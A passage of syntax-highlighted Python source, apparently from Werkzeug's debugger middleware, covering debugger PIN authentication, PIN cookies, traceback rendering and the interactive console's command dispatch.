punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Callable<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Any<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>        show_hidden_frames<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span>        pin_security<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">,</span>        pin_logging<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> console_init_func<span class="token punctuation">:</span>            console_init_func <span class="token operator">=</span> <span class="token boolean">None</span>        self<span class="token punctuation">.</span>app <span class="token operator">=</span> app        self<span class="token punctuation">.</span>evalex <span class="token operator">=</span> evalex        self<span class="token punctuation">.</span>frames<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Dict<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>DebugFrameSummary<span class="token punctuation">,</span> _ConsoleFrame<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        self<span class="token punctuation">.</span>frame_contexts<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Dict<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>List<span class="token punctuation">[</span>t<span class="token punctuation">.</span>ContextManager<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        self<span class="token punctuation">.</span>request_key <span class="token operator">=</span> request_key        self<span class="token punctuation">.</span>console_path <span class="token operator">=</span> console_path        self<span class="token punctuation">.</span>console_init_func <span class="token operator">=</span> console_init_func        self<span class="token punctuation">.</span>show_hidden_frames <span class="token operator">=</span> show_hidden_frames        self<span class="token punctuation">.</span>secret <span class="token operator">=</span> gen_salt<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_failed_pin_auth <span class="token operator">=</span> <span class="token number">0</span>        self<span class="token punctuation">.</span>pin_logging <span class="token operator">=</span> pin_logging        <span class="token keyword">if</span> pin_security<span class="token punctuation">:</span>            <span class="token comment"># Print out the pin for the debugger on standard out.</span>            <span class="token keyword">if</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"WERKZEUG_RUN_MAIN"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"true"</span> <span class="token keyword">and</span> pin_logging<span class="token punctuation">:</span>                _log<span class="token punctuation">(</span><span class="token string">"warning"</span><span class="token punctuation">,</span> <span class="token string">" * Debugger is active!"</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>pin <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    _log<span class="token punctuation">(</span><span class="token string">"warning"</span><span class="token punctuation">,</span> <span class="token string">" * Debugger PIN disabled. DEBUGGER UNSECURED!"</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    _log<span class="token punctuation">(</span><span class="token string">"info"</span><span class="token punctuation">,</span> <span class="token string">" * Debugger PIN: %s"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>pin<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>pin <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token decorator annotation punctuation">@property</span>    <span class="token keyword">def</span> <span class="token function">pin</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"_pin"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            pin_cookie <span class="token operator">=</span> get_pin_and_cookie_name<span class="token punctuation">(</span>self<span class="token punctuation">.</span>app<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>_pin<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_pin_cookie <span class="token operator">=</span> pin_cookie  <span class="token comment"># type: ignore</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_pin    <span class="token decorator annotation punctuation">@pin<span class="token punctuation">.</span>setter</span>    <span class="token keyword">def</span> <span class="token function">pin</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>_pin <span class="token operator">=</span> value    <span class="token decorator annotation punctuation">@property</span>    <span class="token keyword">def</span> <span class="token function">pin_cookie_name</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""The name of the pin cookie."""</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"_pin_cookie"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            pin_cookie <span class="token operator">=</span> get_pin_and_cookie_name<span class="token punctuation">(</span>self<span class="token punctuation">.</span>app<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>_pin<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_pin_cookie <span class="token operator">=</span> pin_cookie  <span class="token comment"># type: ignore</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_pin_cookie    <span class="token keyword">def</span> <span class="token function">debug_application</span><span class="token punctuation">(</span>        self<span class="token punctuation">,</span> environ<span class="token punctuation">:</span> <span class="token string">"WSGIEnvironment"</span><span class="token punctuation">,</span> start_response<span class="token punctuation">:</span> <span class="token string">"StartResponse"</span>    <span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Iterator<span class="token punctuation">[</span><span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Run the application and conserve the traceback frames."""</span>        contexts<span class="token punctuation">:</span> t<span class="token punctuation">.</span>List<span class="token punctuation">[</span>t<span class="token punctuation">.</span>ContextManager<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Any<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>evalex<span class="token punctuation">:</span>            environ<span class="token punctuation">[</span><span class="token string">"werkzeug.debug.preserve_context"</span><span class="token punctuation">]</span> <span class="token operator">=</span> contexts<span class="token punctuation">.</span>append        app_iter <span class="token operator">=</span> <span class="token boolean">None</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            app_iter <span class="token operator">=</span> self<span class="token punctuation">.</span>app<span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span>            <span class="token keyword">yield</span> <span class="token keyword">from</span> app_iter            <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>app_iter<span class="token punctuation">,</span> <span class="token string">"close"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                app_iter<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># type: ignore</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>app_iter<span class="token punctuation">,</span> <span class="token string">"close"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                app_iter<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># type: ignore</span>            tb <span class="token operator">=</span> DebugTraceback<span class="token punctuation">(</span>e<span class="token punctuation">,</span> skip<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> hide<span class="token operator">=</span><span class="token keyword">not</span> self<span class="token punctuation">.</span>show_hidden_frames<span class="token punctuation">)</span>            <span class="token keyword">for</span> frame <span class="token keyword">in</span> tb<span class="token punctuation">.</span>all_frames<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> frame                self<span class="token punctuation">.</span>frame_contexts<span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> contexts            is_trusted <span class="token operator">=</span> <span class="token builtin">bool</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>check_pin_trust<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token punctuation">)</span>            html <span class="token operator">=</span> tb<span class="token punctuation">.</span>render_debugger_html<span class="token punctuation">(</span>                evalex<span class="token operator">=</span>self<span class="token punctuation">.</span>evalex<span class="token punctuation">,</span>                secret<span class="token operator">=</span>self<span class="token punctuation">.</span>secret<span class="token punctuation">,</span>                evalex_trusted<span class="token operator">=</span>is_trusted<span class="token punctuation">,</span>            <span class="token punctuation">)</span>            response <span class="token operator">=</span> Response<span class="token punctuation">(</span>html<span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token number">500</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">"text/html"</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">yield</span> <span class="token keyword">from</span> response<span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>                <span class="token comment"># if we end up here there has been output but an error</span>                <span class="token comment"># occurred.  in that situation we can do nothing fancy any</span>                <span class="token comment"># more, better log something into the error log and fall</span>                <span class="token comment"># back gracefully.</span>                environ<span class="token punctuation">[</span><span class="token string">"wsgi.errors"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>                    <span class="token string">"Debugging middleware caught exception in streamed "</span>                    <span class="token string">"response at a point where response headers were already "</span>                    <span class="token string">"sent.\n"</span>                <span class="token punctuation">)</span>            environ<span class="token punctuation">[</span><span class="token string">"wsgi.errors"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>tb<span class="token punctuation">.</span>render_traceback_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">execute_command</span><span class="token punctuation">(</span>  <span class="token comment"># type: ignore[return]</span>        self<span class="token punctuation">,</span>        request<span class="token punctuation">:</span> Request<span class="token punctuation">,</span>        command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>        frame<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>DebugFrameSummary<span class="token punctuation">,</span> _ConsoleFrame<span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Execute a command in a console."""</span>        contexts <span class="token operator">=</span> self<span class="token punctuation">.</span>frame_contexts<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> ExitStack<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> exit_stack<span class="token punctuation">:</span>            <span class="token keyword">for</span> cm <span class="token keyword">in</span> contexts<span class="token punctuation">:</span>                exit_stack<span class="token punctuation">.</span>enter_context<span class="token punctuation">(</span>cm<span class="token punctuation">)</span>            <span class="token keyword">return</span> Response<span class="token punctuation">(</span>frame<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">"text/html"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">display_console</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">:</span> Request<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Display a standalone shell."""</span>        <span class="token keyword">if</span> <span class="token number">0</span> <span class="token keyword">not</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>frames<span class="token punctuation">:</span>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>console_init_func <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                ns <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                ns <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>console_init_func<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            ns<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token string">"app"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>app<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> _ConsoleFrame<span class="token punctuation">(</span>ns<span class="token punctuation">)</span>        is_trusted <span class="token operator">=</span> <span class="token builtin">bool</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>check_pin_trust<span class="token punctuation">(</span>request<span class="token punctuation">.</span>environ<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> Response<span class="token punctuation">(</span>            render_console_html<span class="token punctuation">(</span>secret<span class="token operator">=</span>self<span class="token punctuation">.</span>secret<span class="token punctuation">,</span> evalex_trusted<span class="token operator">=</span>is_trusted<span class="token punctuation">)</span><span class="token punctuation">,</span>            mimetype<span class="token operator">=</span><span class="token string">"text/html"</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_resource</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">:</span> Request<span class="token punctuation">,</span> filename<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Return a static resource from the shared folder."""</span>        path <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token string">"shared"</span><span class="token punctuation">,</span> basename<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> pkgutil<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span>__package__<span class="token punctuation">,</span> path<span class="token punctuation">)</span>        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>            <span class="token keyword">return</span> NotFound<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># type: ignore[return-value]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> data <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> NotFound<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># type: ignore[return-value]</span>            etag <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>adler32<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>                BytesIO<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>environ<span class="token punctuation">,</span> download_name<span class="token operator">=</span>filename<span class="token punctuation">,</span> etag<span class="token operator">=</span>etag            <span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">check_pin_trust</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> environ<span class="token punctuation">:</span> <span class="token string">"WSGIEnvironment"</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span><span class="token builtin">bool</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Checks if the request passed the pin test.  This returns `True` if the        request is trusted on a pin/cookie basis and returns `False` if not.        Additionally if the cookie's stored pin hash is wrong it will return        `None` so that appropriate action can be taken.        """</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>pin <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        val <span class="token operator">=</span> parse_cookie<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pin_cookie_name<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> val <span class="token keyword">or</span> <span class="token string">"|"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> val<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        ts_str<span class="token punctuation">,</span> pin_hash <span class="token operator">=</span> val<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            ts <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ts_str<span class="token punctuation">)</span>        <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">if</span> pin_hash <span class="token operator">!=</span> hash_pin<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pin<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">None</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> PIN_TIME<span class="token punctuation">)</span> <span class="token operator">&lt;</span> ts    <span class="token keyword">def</span> <span class="token function">_fail_pin_auth</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5.0</span> <span class="token keyword">if</span> self<span class="token punctuation">.</span>_failed_pin_auth <span class="token operator">></span> <span class="token number">5</span> <span class="token keyword">else</span> <span class="token number">0.5</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_failed_pin_auth <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">def</span> <span class="token function">pin_auth</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">:</span> Request<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Authenticates with the pin."""</span>        exhausted <span class="token operator">=</span> <span class="token boolean">False</span>        auth <span class="token operator">=</span> <span class="token boolean">False</span>        trust <span class="token operator">=</span> self<span class="token punctuation">.</span>check_pin_trust<span class="token punctuation">(</span>request<span class="token punctuation">.</span>environ<span class="token punctuation">)</span>        pin <span class="token operator">=</span> t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>pin<span class="token punctuation">)</span>        <span class="token comment"># If the trust return value is `None` it means that the cookie is</span>        <span class="token comment"># set but the stored pin hash value is bad.  This means that the</span>        <span class="token comment"># pin was changed.  In this case we count a bad auth and unset the</span>        <span class="token comment"># cookie.  This way it becomes harder to guess the cookie name</span>        <span class="token comment"># instead of the pin as we still count up failures.</span>        bad_cookie <span class="token operator">=</span> <span class="token boolean">False</span>        <span class="token keyword">if</span> trust <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>_fail_pin_auth<span class="token punctuation">(</span><span class="token punctuation">)</span>            bad_cookie <span class="token operator">=</span> <span class="token boolean">True</span>        <span class="token comment"># If we're trusted, we're authenticated.</span>        <span class="token keyword">elif</span> trust<span class="token punctuation">:</span>            auth <span class="token operator">=</span> <span class="token boolean">True</span>        <span class="token comment"># If we failed too many times, then we're locked out.</span>        <span class="token keyword">elif</span> self<span class="token punctuation">.</span>_failed_pin_auth <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            exhausted <span class="token operator">=</span> <span class="token boolean">True</span>        <span class="token comment"># Otherwise go through pin based authentication</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            entered_pin <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">"pin"</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> entered_pin<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">==</span> pin<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>_failed_pin_auth <span class="token operator">=</span> <span class="token number">0</span>                auth <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>_fail_pin_auth<span class="token punctuation">(</span><span class="token punctuation">)</span>        rv <span class="token operator">=</span> Response<span class="token punctuation">(</span>            json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"auth"</span><span class="token punctuation">:</span> auth<span class="token punctuation">,</span> <span class="token string">"exhausted"</span><span class="token punctuation">:</span> exhausted<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            mimetype<span class="token operator">=</span><span class="token string">"application/json"</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span>        <span class="token keyword">if</span> auth<span class="token punctuation">:</span>            rv<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span>                self<span class="token punctuation">.</span>pin_cookie_name<span class="token punctuation">,</span>                <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>hash_pin<span class="token punctuation">(</span>pin<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>                httponly<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>                samesite<span class="token operator">=</span><span class="token string">"Strict"</span><span class="token punctuation">,</span>                secure<span class="token operator">=</span>request<span class="token punctuation">.</span>is_secure<span class="token punctuation">,</span>            <span class="token punctuation">)</span>        <span class="token keyword">elif</span> bad_cookie<span class="token punctuation">:</span>            rv<span class="token punctuation">.</span>delete_cookie<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pin_cookie_name<span class="token punctuation">)</span>        <span class="token keyword">return</span> rv    <span class="token keyword">def</span> <span class="token function">log_pin_request</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Log the pin if needed."""</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>pin_logging <span class="token keyword">and</span> self<span class="token punctuation">.</span>pin <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            _log<span class="token punctuation">(</span>                <span class="token string">"info"</span><span class="token punctuation">,</span> <span class="token string">" * To enable the debugger you need to enter the security pin:"</span>            <span class="token punctuation">)</span>            _log<span class="token punctuation">(</span><span class="token string">"info"</span><span class="token punctuation">,</span> <span class="token string">" * Debugger pin code: %s"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>pin<span class="token punctuation">)</span>        <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__call__</span><span class="token punctuation">(</span>        self<span class="token punctuation">,</span> environ<span class="token punctuation">:</span> <span class="token string">"WSGIEnvironment"</span><span class="token punctuation">,</span> start_response<span class="token punctuation">:</span> <span class="token string">"StartResponse"</span>    <span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Iterable<span class="token punctuation">[</span><span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Dispatch the requests."""</span>        <span class="token comment"># important: don't ever access a function here that reads the incoming</span>        <span class="token comment"># form data!  Otherwise the application won't have access to that data</span>        <span class="token comment"># any more!</span>        request <span class="token operator">=</span> Request<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>        response <span class="token operator">=</span> self<span class="token punctuation">.</span>debug_application        <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"__debugger__"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"yes"</span><span class="token punctuation">:</span>            cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span>            arg <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"f"</span><span class="token punctuation">)</span>            secret <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">)</span>            frame <span class="token operator">=</span> self<span class="token punctuation">.</span>frames<span class="token punctuation">.</span>get<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"frm"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># type: ignore</span>            <span class="token keyword">if</span> cmd <span class="token operator">==</span> <span class="token string">"resource"</span> <span class="token keyword">and</span> arg<span class="token punctuation">:</span>                response <span class="token operator">=</span> self<span class="token punctuation">.</span>get_resource<span class="token punctuation">(</span>request<span class="token punctuation">,</span> arg<span class="token punctuation">)</span>  <span class="token comment"># type: ignore</span>            <span class="token keyword">elif</span> cmd <span class="token operator">==</span> <span class="token string">"pinauth"</span> <span class="token keyword">and</span> secret <span class="token operator">==</span> self<span class="token punctuation">.</span>secret<span class="token punctuation">:</span>                response <span class="token operator">=</span> self<span class="token punctuation">.</span>pin_auth<span class="token punctuation">(</span>request<span class="token punctuation">)</span>  <span class="token comment"># type: ignore</span>            <span class="token keyword">elif</span> cmd <span class="token operator">==</span> <span class="token string">"printpin"</span> <span class="token keyword">and</span> secret <span class="token operator">==</span> self<span class="token punctuation">.</span>secret<span class="token punctuation">:</span>                response <span class="token operator">=</span> self<span class="token punctuation">.</span>log_pin_request<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># type: ignore</span>            <span class="token keyword">elif</span> <span class="token punctuation">(</span>                self<span class="token punctuation">.</span>evalex                <span class="token keyword">and</span> cmd <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span>                <span class="token keyword">and</span> frame <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span>                <span class="token keyword">and</span> self<span class="token punctuation">.</span>secret <span class="token operator">==</span> secret                <span class="token keyword">and</span> self<span class="token punctuation">.</span>check_pin_trust<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">:</span>                response <span class="token operator">=</span> self<span class="token punctuation">.</span>execute_command<span class="token punctuation">(</span>request<span class="token punctuation">,</span> cmd<span class="token punctuation">,</span> frame<span class="token punctuation">)</span>  <span class="token comment"># type: ignore</span>        <span class="token keyword">elif</span> <span class="token punctuation">(</span>            self<span class="token 